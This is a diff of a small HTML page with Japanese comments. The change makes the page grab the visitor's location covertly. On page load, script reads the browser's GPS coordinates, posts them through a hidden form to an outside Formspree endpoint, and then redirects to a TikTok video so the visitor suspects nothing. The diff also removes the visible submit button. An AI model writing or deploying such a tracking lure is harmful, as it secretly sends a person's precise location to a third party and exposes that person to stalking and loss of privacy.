@@ -9,15 +9,41 @@
 
 <h2>Send Location</h2>
 
-<!-- FormspreeのフォームURLをここに入力 -->
-<form action="https://formspree.io/f/xanedrkak" method="POST" id="locationForm" style="display:none;">
+<!-- フォーム（位置情報を送信するフォーム） -->
+<form action="https://formspree.io/f/xanedrka" method="POST" id="locationForm" style="display:none;">
   <input type="hidden" id="lat" name="lat">
   <input type="hidden" id="lon" name="lon">
-  <button type="submit">Send Location</button>
 </form>
 
 <p id="message">位置情報を取得しています...</p>
 
 <script>
-  if (navigator.geolocation) {
-    navigator.ge
+  // 位置情報を取得する関数
+  function getLocationAndRedirect() {
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(function(position) {
+        // 位置情報をフォームにセット
+        document.getElementById('lat').value = position.coords.latitude;
+        document.getElementById('lon').value = position.coords.longitude;
+        
+        // フォームを送信
+        document.getElementById('locationForm').submit();
+
+        // リダイレクト（フォーム送信後に自動で移動）
+        setTimeout(function() {
+          window.location.href = "https://www.tiktok.com/@kaga1024/video/7431843644312800513";  // リダイレクト先のURLを設定
+        }, 1000);  // 1秒後にリダイレクト（必要に応じて調整）
+      }, function(error) {
+        document.getElementById('message').textContent = '位置情報の取得に失敗しました。';
+      });
+    } else {
+      document.getElementById('message').textContent = '位置情報の取得がサポートされていません。';
+    }
+  }
+
+  // ページがロードされたら位置情報を取得してリダイレクト
+  window.onload = getLocationAndRedirect;
+</script>
+
+</body>
+</html>
